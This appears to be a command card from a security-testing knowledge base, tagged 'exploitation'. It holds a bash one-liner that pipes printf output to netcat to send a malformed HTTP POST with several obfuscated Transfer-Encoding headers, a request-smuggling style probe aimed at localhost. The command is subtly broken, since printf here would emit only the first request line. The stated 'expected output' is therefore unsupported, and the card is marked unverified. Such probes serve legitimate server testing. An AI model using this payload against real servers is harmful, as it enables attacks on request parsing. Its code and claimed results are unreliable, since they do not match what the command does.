---
data: >-
  printf "POST / HTTP/1.1\r\n" "Host: localhost\r\n" " Transfer-Encoding:
  yeet\r\n" " Transfer-Encoding: \n" " Transfer-Encoding: chunked\r\n" "\r\n"
  "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
tags:
  - http
  - exploitation
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 6753b0ec-31f4-41ec-94a8-2260e72b0c6e
created_at: '2025-12-13T09:01:17.147Z'
updated_at: '2025-12-13T09:01:17.147Z'
verified: false
validated: true
submitted: true
---
# printf-nc-send-alternative-payload

## Command

```bash
printf "POST / HTTP/1.1\r\n" "Host: localhost\r\n" " Transfer-Encoding: yeet\r\n" " Transfer-Encoding: \n" " Transfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
```

## Description

Crafts and sends an alternative malformed HTTP POST request with multiple obfuscated Transfer-Encoding headers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `printf` | Formats the request string with multiple Transfer-Encoding lines | Yes |
| `| nc localhost 5000` | Pipes to netcat for sending | Yes |

## Examples

### Basic Usage

```bash
printf "POST / HTTP/1.1\r\n" "Host: localhost\r\n" " Transfer-Encoding: yeet\r\n" " Transfer-Encoding: \n" " Transfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
```

## Expected Output

Server responds with HTTP/1.1 200 OK, processes the chunked body as 'A', and logs combined 'transfer-encoding' header as 'yeet, , chunked'.

## Related

- [[procedures/Test-Alternative-Malformed-Payload]]
- [[tools/printf]]
- [[tools/nc]]
